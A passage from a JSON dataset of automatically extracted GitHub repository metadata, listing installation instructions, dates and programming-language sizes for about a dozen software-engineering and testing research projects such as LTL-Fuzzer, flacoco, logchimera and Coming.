                    "value": "* Specifying the home directory, e.g., at home dir:\n```\n  export LTLFuzzer=~/LTL-Fuzzer/\n```\n* Specifying the subject directory and name under test:\n```\n  export SUBJECT=$LTLFuzzer/experiment/Problem1/\n  export EXECName=Problem1\n```\n* Specifying a LTL property to be checked:\n```\n  export LTL=\"!(! (true U oU) | (! oU U ((oZ & ! oU) & X (! oU U oP))))\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparing for Instrumentation",
                    "parent_header": [
                        "Example Usage",
                        "Protocol Example"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ltlfuzzer/LTL-Fuzzer/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-22T11:23:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T14:06:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 538649
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 126224
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 62636
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17782
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 13993
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3476
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 2011
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "424": {
        "filename": "KTH_styler_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/styler",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-09-04T09:11:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-05T11:41:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 86668
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "425": {
        "filename": "rasheedja_LPPaver_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rasheedja/LPPaver",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\nstack build\n```\n \n",
                    "original_header": "Stack"
                },
                "confidence": 0.927181785761805,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rasheedja/LPPaver/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\ncabal build\n```\n \n",
                    "original_header": "Cabal"
                },
                "confidence": 0.980158216893385,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rasheedja/LPPaver/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-23T21:30:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-11T11:05:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 647613
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SMT",
                    "name": "SMT",
                    "type": "Programming_language",
                    "size": 133092
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 92390
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 16582
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "426": {
        "filename": "SpoonLabs_flacoco_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/flacoco",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "flacoco is currently available through Maven Central and as a SNAPSHOT\n\nYou can use it by installing locally yourself (if you do so, the install version will be `1.0.7-SNAPSHOT`), or by adding flacoco as a maven dependency:\n```bash\n$ mvn install -DskipTests\n```\n```xml\n<dependency>\n    <groupId>com.github.spoonlabs</groupId>\n    <artifactId>flacoco</artifactId>\n    <version>1.0.6</version>\n</dependency>\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "flacoco \u00b7 <a href=\"https://github.com/SpoonLabs/flacoco/actions/workflows/tests.yml\"><img alt=\"tests\" src=\"https://github.com/SpoonLabs/flacoco/actions/workflows/tests.yml/badge.svg\" /></a> <a href=\"https://codecov.io/gh/SpoonLabs/flacoco\"><img alt=\"codecov\" src=\"https://codecov.io/gh/SpoonLabs/flacoco/branch/master/graph/badge.svg?token=7WWFGI1KWW\" /></a> <img alt=\"Supported Platforms\" src=\"https://img.shields.io/badge/platforms-Linux%2C%20macOS%2C%20Windows-blue.svg\" /> <a href=\"https://mavenbadges.herokuapp.com/maven-central/com.github.spoonlabs/flacoco\"><img alt=\"Maven Central\" src=\"https://maven-badges.herokuapp.com/maven-central/com.github.spoonlabs/flacoco/badge.svg\" /></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SpoonLabs/flacoco/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* https://github.com/SpoonLabs/CoCoSpoon/\n* https://github.com/GZoltar/gzoltar/\n* https://github.com/saeg/jaguar\n \n",
                    "original_header": "Related tools"
                },
                "confidence": 0.9999999929047689,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SpoonLabs/flacoco/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-11T14:59:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T18:24:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 331109
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "427": {
        "filename": "MEPalma_SyntheticEndUserTesting-Prototype_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MEPalma/SyntheticEndUserTesting-Prototype",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This configuration allows for the execution of multiple frontends with\nthe recording of user actions.\nUser actions are always saved as `jsonl` Lifecycle files in `./LCs`.\n \n",
                    "original_header": "No agent"
                },
                "confidence": 0.9432476369301822,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MEPalma/SyntheticEndUserTesting-Prototype/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Only one backend must be launched.\nA database instance must first be started.\nThis is set to run in a Docker container.\nThe following creates and starts the container.\n```shell\nsh ./src/main/java/backend/launch_db.sh\n``` \n",
                    "original_header": "Backend"
                },
                "confidence": 0.996561102341486,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MEPalma/SyntheticEndUserTesting-Prototype/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After starting a database container instance with:\n```shell\nsh ./src/main/java/backend/launch_db.sh\n``` \n",
                    "original_header": "Single Client"
                },
                "confidence": 0.9572953399694866,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MEPalma/SyntheticEndUserTesting-Prototype/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-23T12:59:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-23T13:01:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 354185
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "AspectJ",
                    "name": "AspectJ",
                    "type": "Programming_language",
                    "size": 18952
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 258
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "428": {
        "filename": "spetrescu_logchimera_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/spetrescu/logchimera",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Install `miniconda`\n```bash\n$ mkdir -p ~/miniconda3\n$ curl https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh -o ~/miniconda3/miniconda.sh\n$ bash ~/miniconda3/miniconda.sh -b -u -p ~/miniconda3\n$ rm -rf ~miniconda3/miniconda.sh\n```\n2. Initialize `miniconda` for bash / zsh shells\n```bash\n$ ~/miniconda3/bin/conda init bash\n$ ~/miniconda3/bin/conda init zsh\n```\n3. Create `logchimera` virtual environment and activate it\n```bash\n$ conda create --name logchimera python=3.9 -y\n$ conda activate logchimera\n$ pip install poetry\n```\n4. Install package\n```bash\n$ git clone https://github.com/spetrescu/logchimera.git\n$ cd logchimera\n$ poetry install\n```\n5. Check if installation was successfull\n```bash\n$ python\nPython 3.9.16 (main, Mar  8 2023, 04:29:44) \n[Clang 14.0.6 ] :: Anaconda, Inc. on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from logchimera.logchimera import function_test\n>>>\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Set-up MacOS",
                    "parent_header": [
                        "logchimera"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/spetrescu/logchimera/main/README.md"
            },
            {
                "result": {
                    "value": "1. Install `miniconda`\n```bash\n$ mkdir -p ~/miniconda3\n$ wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda3/miniconda.sh\n$ bash ~/miniconda3/miniconda.sh -b -u -p ~/miniconda3\n$ rm -rf ~/miniconda3/miniconda.sh\n```\n2. Initialize `miniconda` for bash / zsh shells\n```bash\n$ ~/miniconda3/bin/conda init bash\n$ ~/miniconda3/bin/conda init zsh\n```\n3. Create `logchimera` virtual environment and activate it\n```bash\n$ conda create --name logchimera python=3.9 -y\n$ conda activate logchimera\n$ pip install poetry\n```\n4. Install package\n```bash\n$ git clone https://github.com/spetrescu/logchimera.git\n$ cd logchimera\n$ poetry install\n```\n5. Check if installation was successfull\n```bash\n$ python\nPython 3.9.17 (main, Jul  5 2023, 20:41:20) \n[GCC 11.2.0] :: Anaconda, Inc. on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from logchimera.logchimera import estimate_heterogeneity\n>>>\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Set-up Linux",
                    "parent_header": [
                        "logchimera"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/spetrescu/logchimera/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\n$ pip install logchimera\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "logchimera"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/spetrescu/logchimera/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  <img width=\"230\" alt=\"Group_movie\" src=\"https://github.com/spetrescu/logchimera/assets/60047427/10cc52d6-dc33-4159-a99c-cfc279cf3f11.jpg\">\n  <img width=\"230\" alt=\"Group_movie\" src=\"https://github.com/spetrescu/logchimera/assets/60047427/d2012c9d-753c-4b9d-b867-1c65896c26df.jpg\">\n  <img width=\"230\" alt=\"Group_movie\" src=\"https://github.com/spetrescu/logchimera/assets/60047427/cdc0d927-fbf5-48be-8a6c-e033fb4af958.jpg\"> \n  </p>\n  <p>\n    <a href=\"\">\n      <img alt=\"First release\" src=\"https://img.shields.io/badge/release-v0.1.0-brightgreen.svg\" />\n    </a>\n  </p>\n</div>\n \n",
                    "original_header": "logchimera"
                },
                "confidence": 0.9999092073562457,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/spetrescu/logchimera/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-25T08:37:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-16T13:51:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 46400
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "429": {
        "filename": "czekster_cyberactive_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/czekster/cyberactive",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Find information on file `_README.first` in this repository as well as requirements for running it stand-alone.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing the tool"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/czekster/cyberactive/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-11-10T10:43:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-25T13:40:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 406181
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 48537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 5740
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Hack",
                    "name": "Hack",
                    "type": "Programming_language",
                    "size": 4761
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2170
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "430": {
        "filename": "Spirals-Team_coming_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SpoonLabs/coming",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Coming is deployed on Maven Central, see [past versions](https://repo1.maven.org/maven2/com/github/spoonlabs/coming/).\nAs of version 1.72 (May 2024), it requires Java 17.\n\nTo build yourself, the procedure is as follows.\n\nAdd a github token in `.m2/settings.xml`.\n\n```xml\n<settings>\n  <servers>\n    <server>\n      <id>brufulascam</id>\n      <username>yourlogin</username>\n      \n      <password>FOOBAR</password>\n    </server>\n  </servers>\n</settings>\n```\n\n\nInstall a JDK 17 and configure Maven or your IDE to use it.\n\n\n```\n$ export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64/\n$ mvn -version\nApache Maven 3.6.3\nMaven home: /usr/share/maven\nJava version: 17.0.9, vendor: Private Build, runtime: /usr/lib/jvm/java-17-openjdk-amd64\n\n# now installing\n$ mvn install -DskipTests\n```\n\nTests:\n\n```\ngit clone https://github.com/SpoonLabs/repogit4testv0\nmvn test\n```\n\n\n`repogit4testv0` is a GIT repository included inside Coming which is used by the test cases.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Coming"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "value": "\nFor studying only commits which messages include words related to bug fixing (e.g., bug, fix, issue), add the following command.\n\n```\n\n-filter bugfix \n```\n\nThe bugfix keywords are predefined. If you want to use  other keywords, use the `Custom keywords`.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Bug fix keywords",
                    "parent_header": [
                        "Coming",
                        "Filtering Commits",
                        "By commit message"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Coming is a tool for commit analysis in git repositories. \n",
                    "original_header": "Coming"
                },
                "confidence": 0.9599959789662506,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In order to perform an analysis of possible repair tools that may have generated commits use the python script at https://github.com/kth-tcs/defects4j-repair-reloaded/tree/comrepair-coming/. \n",
                    "original_header": "Mode Repairability"
                },
                "confidence": 0.9964233947156539,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Coming read the input from the folder indicated by the argument `-location`. The kind of input depends on the argument `-input`. \n \n",
                    "original_header": "Input Types"
                },
                "confidence": 0.9268920145664327,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If `-input filespair`, the location argument is supposed to specified in the following format: `-location <source_file_path>:<target_file_path>` \n",
                    "original_header": "filespair"
                },
                "confidence": 0.9783324316147742,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "### files \nIf `-input files`, the location path should follow the following hierarchy. Note here `-location <location_arg>`.\n```\n<location_arg>\n\u251c\u2500\u2500 <diff_folder>\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 <modif_file>\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 <diff_folder>_<modif_file>_s.java\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 <diff_folder>_<modif_file>_t.java\n```\nIn the above case, the analysis are performed on the revision form `<diff_folder>_<modif_file>_s.java` to `<diff_folder>_<modif_file>_t.java`, where `s` stands for source and `t` stands for target. \n",
                    "original_header": "files"
                },
                "confidence": 0.9993044110650349,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For studying only commits which messages include `[MATH-`, add the following two commands:\n```\n\n-filter keywords filtervalue [MATH- \n\n```\n \n",
                    "original_header": "Custom keywords"
                },
                "confidence": 0.994973291005867,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The argument `-filter withtest` indicates that only commits with at least one modification on test cases are considered.\n \n",
                    "original_header": "By presence of Tests"
                },
                "confidence": 0.9217881708805058,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/coming/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-10-01T14:15:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-30T13:11:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 117331202
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2257
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1763
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "431": {
        "filename": "mlte-team_mlte_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mlte-team/mlte",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://raw.githubusercontent.com/mlte-team/mlte/master/assets/MLTE_Logo_Color.svg\" alt=\"mlte_logo\" width=\"150\"/> \n",
                    "original_header": "`mlte`: Machine Learning Test and Evaluation"
                },
                "confidence": 0.9982764933847275,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mlte-team/mlte/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-04T20:08:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T16:03:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 680143
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 148646
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 7309
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3217
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1387
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1278
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "432": {
        "filename": "sajedjalil_ChatGPT-Software-Testing-Study_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sajedjalil/ChatGPT-Software-Testing-Study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can install the latest version of this software directly from GitHub with ```pip```:\n\n```pip install git+https://github.com/mmabrouk/chatgpt-wrapper```\n\nThis will install chatgpt-wrapper and its dependencies. Before starting the program, you will need to install a browser\nin Playwright (if you haven't already). The program will use Firefox by default.\n\n```playwright install firefox```\n\nWith that done, you should start up the program in install mode, which will open up a browser window.\n\n```chatgpt install```\n\nLog in to ChatGPT in the browser window, then stop the program.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "About"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sajedjalil/ChatGPT-Software-Testing-Study/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-06T15:28:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-06T03:00:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 26274
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6197
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "433": {
        "filename": "ERATOMMSD_QUATIC2021-KNN-Averaging_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ERATOMMSD/QUATIC2021-KNN-Averaging",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* [`KlikovitsArcaini-KNNAvgForNoisyNoisyMOO.pdf`](./KlikovitsArcaini-KNNAvgForNoisyNoisyMOO.pdf) Preprint of the paper.\n* [`Klikovits-Arcaini2021_KNNAvg_QUATIC_slides.pdf`](./Klikovits-Arcaini2021_KNNAvg_QUATIC_slides.pdf) Slide deck used for the presentation at QUATIC.\n* [`requirements.txt`](./requirements.txt): Python dependencies. Install via `pip install -r requirements.txt`\n* [`main.py`](./main.py): Entrypoint for search. To alter search settings, modify `create_settings_and_run()` function.\n* [`knn_wrapper.py`](./knn_wrapper.py) Wrapper for [Pymoo](https://pymoo.org/) benchmark problems. Use via `knn_wrapper.wrap_problem(knn_wrapper.KNNAvgMixin, zdt.ZDT1, ...)`.\n* [`output/`](./output) This will be where the search will put the output data (currently empty).\n* [`result_plots/`](./results_plots/) Supporting data and result plots for the publication. Subfolders/filenames provide information about search settings\n    * [`results_plots/KNNAvgMixin_ZDT1_V2/`](./results_plots/KNNAvgMixin_ZDT1_V2)  ZDT1 benchmark with 2 search variables\n    * [`results_plots/KNNAvgMixin_ZDT1_V4/`](./results_plots/KNNAvgMixin_ZDT1_V4)  ZDT1 benchmark with 4 search variables\n    * [`results_plots/KNNAvgMixin_ZDT1_V10/`](./results_plots/KNNAvgMixin_ZDT1_V10)  ZDT1 benchmark with 10 search variables\n    * [`results_plots/KNNAvgMixin_ZDT2_V2/`](./results_plots/KNNAvgMixin_ZDT2_V2)  ZDT2 benchmark with 2 search variables\n    * [`results_plots/KNNAvgMixin_ZDT2_V4/`](./results_plots/KNNAvgMixin_ZDT2_V4)  ZDT2 benchmark with 4 search variables\n    * [`results_plots/KNNAvgMixin_ZDT2_V10/`](./results_plots/KNNAvgMixin_ZDT2_V10)  ZDT2 benchmark with 10 search variables\n    * [`results_plots/KNNAvgMixin_ZDT3_V2/`](./results_plots/KNNAvgMixin_ZDT3_V2)  ZDT3 benchmark with 2 search variables\n    * [`results_plots/KNNAvgMixin_ZDT3_V4/`](./results_plots/KNNAvgMixin_ZDT3_V4)  ZDT3 benchmark with 4 search variables\n    * [`results_plots/KNNAvgMixin_ZDT3_V10/`](./results_plots/KNNAvgMixin_ZDT3_V10)  ZDT3 benchmark with 10 search variables\n \n",
                    "original_header": "In this repository"
                },
                "confidence": 0.9999993967805495,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ERATOMMSD/QUATIC2021-KNN-Averaging/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-25T08:03:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-09-10T14:14:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
